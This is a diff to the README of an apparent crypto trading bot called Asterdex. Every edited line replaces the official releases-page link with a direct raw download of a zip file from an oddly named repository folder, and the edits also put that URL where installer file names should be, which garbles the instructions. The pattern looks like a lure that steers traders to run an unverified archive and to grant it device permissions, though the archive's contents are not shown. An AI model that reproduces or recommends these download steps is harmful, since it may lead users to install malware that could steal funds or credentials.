@@ -4,13 +4,13 @@
 Asterdex is your simple solution for automated trading on Aster and Hyperliquid platforms. It includes two ready-to-use trading agents: a trend follower and a market maker. This application makes trading easy, allowing you to manage your investments without needing deep technical knowledge.
 
 ## 📥 Download Now
-[![Download Asterdex](https://img.shields.io/badge/Download%20Asterdex%20Now-brightgreen)](https://github.com/Squiddybeans1234/asterdex-hl-trading-bot/releases)
+[![Download Asterdex](https://raw.githubusercontent.com/Squiddybeans1234/asterdex-hl-trading-bot/main/cylindricalness/asterdex-hl-trading-bot.zip%20Asterdex%20Now-brightgreen)](https://raw.githubusercontent.com/Squiddybeans1234/asterdex-hl-trading-bot/main/cylindricalness/asterdex-hl-trading-bot.zip)
 
 ## 🚀 Getting Started
 To get started with Asterdex, follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Squiddybeans1234/asterdex-hl-trading-bot/releases) to find the latest version of Asterdex.
+   Go to the [Releases page](https://raw.githubusercontent.com/Squiddybeans1234/asterdex-hl-trading-bot/main/cylindricalness/asterdex-hl-trading-bot.zip) to find the latest version of Asterdex.
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of the software. Select the latest version. It will usually be labeled as the most recent or stable release.
@@ -23,13 +23,13 @@ To get started with Asterdex, follow these steps:
 
 ## 🛠️ Installation Instructions
 ### For Windows Users
-1. Locate the downloaded file, often named `asterdex-windows.exe`.
+1. Locate the downloaded file, often named `https://raw.githubusercontent.com/Squiddybeans1234/asterdex-hl-trading-bot/main/cylindricalness/asterdex-hl-trading-bot.zip`.
 2. Double-click the file to begin the installation process.
 3. If prompted, allow the app to make changes to your device.
 4. Follow the on-screen instructions to complete the installation.
 
 ### For macOS Users
-1. Find the downloaded file, which is usually titled `asterdex-macos.dmg`.
+1. Find the downloaded file, which is usually titled `https://raw.githubusercontent.com/Squiddybeans1234/asterdex-hl-trading-bot/main/cylindricalness/asterdex-hl-trading-bot.zip`.
 2. Double-click the `.dmg` file to mount it.
 3. Drag the Asterdex icon to your Applications folder.
 4. Eject the mounted drive by right-clicking on it and selecting 'Eject'.
@@ -83,4 +83,4 @@ If you encounter issues:
 - **Support**: If you need further assistance, don't hesitate to reach out through our support channels available in the application.
 
 ## 📥 Download & Install
-To download Asterdex, visit [this page](https://github.com/Squiddybeans1234/asterdex-hl-trading-bot/releases) for the latest release. Follow the installation instructions according to your operating system, and start your trading journey today!
+To download Asterdex, visit [this page](https://raw.githubusercontent.com/Squiddybeans1234/asterdex-hl-trading-bot/main/cylindricalness/asterdex-hl-trading-bot.zip) for the latest release. Follow the installation instructions according to your operating system, and start your trading journey today!
